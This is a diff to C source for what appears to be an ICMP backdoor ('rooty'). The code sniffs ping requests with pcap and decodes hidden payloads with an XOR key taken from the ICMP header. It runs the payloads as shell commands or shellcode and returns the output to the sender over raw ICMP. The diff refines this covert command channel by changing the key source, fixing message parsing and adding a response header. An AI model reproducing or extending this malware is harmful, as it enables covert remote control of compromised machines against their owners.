@@ -1,6 +1,5 @@
 #include "rooty.h"
 
-int output_socket = 0;
 
 int build_packet(unsigned char *pkt, const struct icmphdr *icmp_input, uint8_t *data, uint32_t size) {
 	struct icmphdr *icmp = NULL;
@@ -31,12 +30,13 @@ void send_packet(const uint8_t *data, uint32_t size, const struct iphdr *ip, con
 	uint32_t pkt_size = sizeof(struct icmphdr) + size;
 	uint8_t encrypted_data[size], *key = NULL, pkt[pkt_size];
 	struct sockaddr_in sin;
+	int output_socket = 0;
 
 	// Make sure we have data
 	if(size > 0) {
 
 		// Generate the key for transmission
-		key = (unsigned char *)&icmp->un.echo.sequence;
+		key = (unsigned char *)&icmp->checksum;
 
 		// Encrypt the data
 		if(decrypt_message(data, encrypted_data, size, key) == size) {
@@ -52,8 +52,16 @@ void send_packet(const uint8_t *data, uint32_t size, const struct iphdr *ip, con
 				sin.sin_port = 0;
 				sin.sin_addr.s_addr = ip->saddr;
 
-				// Not going to worry about failures
-				sendto(output_socket, pkt, pkt_size, 0, (struct sockaddr *)&sin, sizeof(struct sockaddr_in));
+				// Create our socket for sending responses
+				if((output_socket = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP)) > 0) {
+
+					// Not going to worry about failures
+					if(sendto(output_socket, pkt, pkt_size, 0, (struct sockaddr *)&sin, sizeof(struct sockaddr_in)) <= 0) {
+						fprintf(stderr, "Unable to send packet\n");
+					}
+
+					close(output_socket);
+				}
 			}
 		}
 	}
@@ -100,24 +108,32 @@ void run_shellcode(const unsigned char *shellcode, uint32_t size) {
 
 void run_command(const unsigned char *command, uint32_t size, const struct iphdr *ip, const struct icmphdr *icmp) {
 	FILE *fd = NULL;
-	uint8_t cmd[size + 1], buf[MAX_PACKET_SIZE];
-	uint32_t read = 0;
+	uint8_t cmd[size + 1], buf[MAX_PACKET_SIZE], msg[MAX_PACKET_SIZE + strlen(MAGIC) + 1];
+	uint32_t read = 0, cmd_size = size + 1;
 
 	// Need to copy and null terminate the command
-	memset(cmd, 0, size + 1);
+	memset(cmd, 0, cmd_size);
 	memcpy(cmd, command, size);
 
+	// Set the response magic and type
+	memcpy(msg, MAGIC, strlen(MAGIC));
+	msg[strlen(MAGIC)] = '\x02';
+
 	// Execute the command
-	if((fd = popen(command, "r")) != NULL) {
+	if((fd = popen(cmd, "r")) != NULL) {
 
 		while((read = fread(buf, 1, MAX_PACKET_SIZE, fd)) > 0) {
-			send_packet(buf, read, ip, icmp);
+			memcpy(msg + strlen(MAGIC) + 1, buf, read);
+
+			send_packet(msg, read, ip, icmp);
+			printf("%s\n", buf);
 		}
 	}
 }
 
 int decrypt_message(const unsigned char *data, unsigned char *decoded_data, uint32_t size, unsigned char *key) {
 	int ctr;
+
 
 	for(ctr = 0; ctr < size; ctr++) {	
 		decoded_data[ctr] = ((data[ctr] ^ key[0]) ^ key[1]);
@@ -128,7 +144,7 @@ int decrypt_message(const unsigned char *data, unsigned char *decoded_data, uint
 
 void process_message(const unsigned char *data, uint32_t size, const struct iphdr *ip, const struct icmphdr *icmp) {
 	unsigned char decoded_data[size];
-	unsigned char *key = (unsigned char *)&(icmp->un.echo.sequence);
+	unsigned char *key = (unsigned char *)&(icmp->checksum);
 	uint32_t data_len = 0, hdr_len = 0;
 	uint8_t msg_type = 0;
 
@@ -142,7 +158,7 @@ void process_message(const unsigned char *data, uint32_t size, const struct iphd
 			if(!strncmp(decoded_data, MAGIC, strlen(MAGIC))) {
 				hdr_len = strlen(MAGIC) + 1;
 				data_len = size - hdr_len;
-				msg_type = data[hdr_len - 2];
+				msg_type = decoded_data[hdr_len - 1];
 
 				// First byte should be the message type
 				switch(msg_type) {
@@ -162,7 +178,7 @@ void process_packet(u_char *user_data, const struct pcap_pkthdr *hdr, const u_ch
 	const struct ether_arp *ethernet = NULL;
 	const struct iphdr *ip = NULL;
 	const struct icmphdr *icmp = NULL;
-	u_int size_ip, size_icmp;
+	uint32_t size_ip, size_icmp, size_data;
 	const unsigned char *data = NULL;
 
 	// Ethernet
@@ -178,6 +194,7 @@ void process_packet(u_char *user_data, const struct pcap_pkthdr *hdr, const u_ch
 
 	// Data
 	data = (unsigned char *)(pkt + SIZE_ETHERNET + size_ip + size_icmp);
+	size_data = (hdr->len - size_ip - size_icmp - SIZE_ETHERNET);
 
 	// Only want to deal with icmp echo requests
 	if((icmp->type == 8) && (icmp->code == 0)) {
@@ -232,12 +249,6 @@ int main(int argc, char *argv[0]) {
 	// Finally set up our filter
 	if(pcap_setfilter(handle, &fp)) {
 		fprintf(stderr, "Error applying bpf filter '%s': %s\n", bpf_filter, pcap_geterr(handle));
-		return -1;
-	}
-
-	// Create our socket for sending responses
-	if((output_socket = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP)) <= 0) {
-		fprintf(stderr, "Error creating raw socket\n");
 		return -1;
 	}
 
